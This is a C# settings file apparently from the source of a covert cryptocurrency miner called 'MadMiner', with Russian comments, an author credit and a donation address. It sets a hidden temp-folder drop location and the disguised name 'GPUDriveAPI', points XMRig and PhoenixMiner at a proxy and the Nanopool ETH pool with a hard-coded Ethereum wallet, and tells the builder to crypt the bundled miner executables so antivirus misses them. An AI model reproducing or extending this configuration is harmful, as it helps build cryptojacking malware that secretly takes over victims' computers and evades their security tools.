// Miner by MadCode / @madcod
// BTC: 1PdaiaWVKvozFvBsvHnc5ZtST8ZnGzwAE4 Спасибо)

using System.IO;

namespace MadMiner
{
    class Settings
    {

        // Настройки тела майнера
        public static readonly string workDir = Path.GetTempPath(); // Settings.workDir
        public static readonly string workPatch = Path.Combine(workDir, "PATCH MINERS"); // Settings.workPatch
        public static string workname = "GPUDriveAPI"; // Settings.workname

        // XMRIG Miner (Работает через XMRIG Proxy!) https://github.com/xmrig/xmrig-proxy
        // Подключение на хешваулт https://monero.hashvault.pro/ru/getting-started
        public static string xmrProc = Help.id + "m"; // Settings.xmrProc
        public static string xmrBin = workPatch + "\\" + xmrProc + ".exe"; // Settings.xmrBin
        public static string xmrProxy = "172.0.0.1:3333"; // Settings.xmrProxy

        // PhoenixMiner заточен под https://eth.nanopool.org/
        public static string poenixProc = Help.id + "e"; // Settings.poenixProc
        public static string poenixBin = workPatch + "\\" + poenixProc + ".exe"; // Settings.poenixBin
        public static string poenixPool = "eth-eu1.nanopool.org:9999"; // Settings.poenixPool
        public static string ethWallet = "0xfB48bD6df2c7DF3CB2c9Af0ae6B18c23E4ac40cd"; // Кошелек Ehereum(ETH) Settings.ethWallet

        // Не забываем что файлы PhoenixAPI.exe и XMRIG.exe которые в ресурсах, надо закриптовать или накрыть протектором хотя-бы!
    }
}
